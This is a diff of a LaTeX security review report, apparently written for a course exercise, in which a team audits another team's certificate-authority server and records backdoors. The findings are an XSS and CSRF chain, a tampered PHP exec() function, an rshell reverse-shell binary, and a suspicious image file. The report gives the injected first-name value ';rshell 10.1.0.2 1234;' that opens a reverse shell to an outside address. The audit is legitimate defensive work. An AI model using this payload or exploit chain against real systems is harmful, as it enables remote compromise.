@@ -338,7 +338,11 @@ We could not find a solution for the backup of log files, they are just rotated 
 We did not find anything of interest here.
 
 \subsubsection{Core}
+There is a very suspicous script in /usr/bin/rshell and /usr/bin/X11/rshell that seems to be some kind of reverse shell that tries to connect to a user defined ip and port that are given by the arguments of the call.
+
 Generally the system uses the standard Ubuntu package management. The only exception for this is the PHP interpreter, which was compiled from the source code. This made us suspicious and together with the source code analysis lead us to a backdoor.
+
+As seen in the Apache configuration, all html and PHP files are in the previously mentioned directories. Additionally we found a strange file called batman.jpg which seems to be there for no purpose. The image has been modified with GD, which is a graphics manipulation library. This could be a sign for some automated processing to steganographically hide data in an image. We tried to find the source image and compare the two versions, but were not able to get any kind of information because of the lossyness of the JPEG compression format.
 
 \subsection{Code Analysis}
 \subsubsection{Core}
@@ -348,9 +352,11 @@ The only files of interest here are the PHP scripts that make up the user and ad
 \item Behind the scene, each request that requires interaction with the CA itself, executes the openssl binary via the exec() and shell\_exec() PHP functions. This made us suspicious, because there is no reason to switch between those two functions, as they nearly do the same and only differ slightly in the way they return the output of the executed command.
 \item All parameters passed to the exec() and shell\_exec() functions are sanitized with escapeshellarg() function. This prevents a potential adversary to execute own code in the shell.
 \item As suspected, the first name of a user is not sanitized in user.php which results in a XSS vulnerability.
+\item Additionally the user's password is not checked when a user updates his data with the form in the user interface.
 \item To prevent any kind of race condition while creating or revoking certificates, the system uses file based locks to prevent simultaneous access to all files that the openssl binary uses.
 \item Again as suspected, the system includes a index.php file, that executes the phpinfo() command.
 \item The basic PHP session system is used to keep track of a users login state and his csrf token.
+\item Surprisin
 \end{itemize}
 
 \section{Conclusion}
@@ -379,34 +385,21 @@ In this section we will list the countermeasures where the implementation differ
 \end{itemize}
 
 \section{Backdoors}
-WRITE HERE ABOUT: 
-Describe all backdoors found on the system. 
-It may be that you also find unintended backdoors, which cannot be distinguished from intentionally added backdoors.
+\subsection{CSRF combined with XSS}
+As previously mentioned, the form that updates a user's information does not use a CSRF token, even though the general functionality is provided by the system. Combined with the fact, that the database value of the first name is not sanitized properly and that the user's password is not checked on updates of his information, this gives an attacker an easy possibility to gain access to a user's account.
 
+A possible way to compromise a user is to get a user to submit a form that the attacker controls that posts it's data to the CA user interface. Because the form does not require the knowledge of the user's password, any data can be submitted and therefore written to the database. Afterwards the user is redirected to the user page, where the previously submitted form data is displayed without sanitizing it. This enables the attacker to inject his own code into the user's main page.
 
-php selber compiled
+\subsection{Batman.jpg}
+As mentioned above in the white-box analysis, this publicly available image could hide any kind of information. We were not able to get any kind of prove that this is the case. Still, we would strongly suggest to remove this file from the production servers.
 
+\subsection{PHP/exec() backdoor}
+After analyzing the self compiled binaries and especially having a look at the shell\_exec() and exec() functions, we came to the conclusion, that there is a hidden backdoor in the exec() function. We think that exec() function splits the string it gets on each semicolon character and then only executes the second slice. This provides an attacker with a way to execute any code even if all input arguments are sanitized with escapeshellarg(). Additionally the firewall forwards all connections from the core server to any external ip on port 1234.
 
-/ext/standart/exec.c
-
-
-/usr/bin/rshell
-
-
-www/user/batman.jpg
-
-
-www/user/protectedimage.php
-
-
-open port 1234 on firewall from inside out
-
-
-XSS/CSRF in general
-
+This can be used by changing the first name of a user to ;rshell 10.1.0.2 1234; and creating a new certificate. This results in the server opening a new shell and binding it to a socket connection to the provided ip and port. Combined with the CSRF and XSS vulnerability above, this enables an attacker to compromise the whole system.
 
 \section{Comparison}
-Comparing the both systems, the first thing that we noticed was the lack of separation in the reviewed system. They also have a designated firewall which filters traffic but they have combined all functionality (webserver, CA core and even backup) on one single server where our system has four different zones, the internet, the network where employees hate their workstations, the DMZ which hosts the webserver and is the only machine accessible from outside by non administrators, as well as the intranet which hosts the CA functionality on one server an the backup and key archive on another server. The access control to all those networks is handled by the firewall.
+Comparing the both systems, the first thing that we noticed was the lack of separation in the reviewed system. They also have a designated firewall which filters traffic but they have combined all functionality (webserver, CA core and even backup) onto one single server. In contrast to that, our system has four different zones, the internet, the network where employees have their workstations, the DMZ which hosts the webserver and is the only machine accessible from outside by non administrators, as well as the intranet which hosts the CA functionality on one server an the backup and key archive on another server. The access control to all those networks is handled by the firewall.
 
 For remote access our system provides we use VPN where the reviewed systems just forwards the SSH ports which both seems to work.
 
